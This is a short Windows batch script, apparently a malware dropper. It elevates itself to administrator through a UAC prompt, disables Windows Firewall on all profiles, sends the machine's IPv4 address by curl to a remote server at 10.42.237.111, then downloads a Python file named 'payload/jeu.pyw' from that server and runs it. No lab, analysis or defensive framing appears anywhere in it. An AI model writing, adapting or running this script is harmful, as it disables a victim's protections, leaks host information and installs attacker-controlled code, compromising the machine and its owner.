@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~fnx0\"' -Verb RunAs"
exit /b
)
NetSh Advfirewall set allprofiles state off
(for /F "tokens=16" %%i in ('"ipconfig | findstr IPv4"') do (curl -d %%i http://10.42.237.111:8888/))
curl http://10.42.237.111:8000/payload/jeu.pyw -o jeu.py
python jeu.py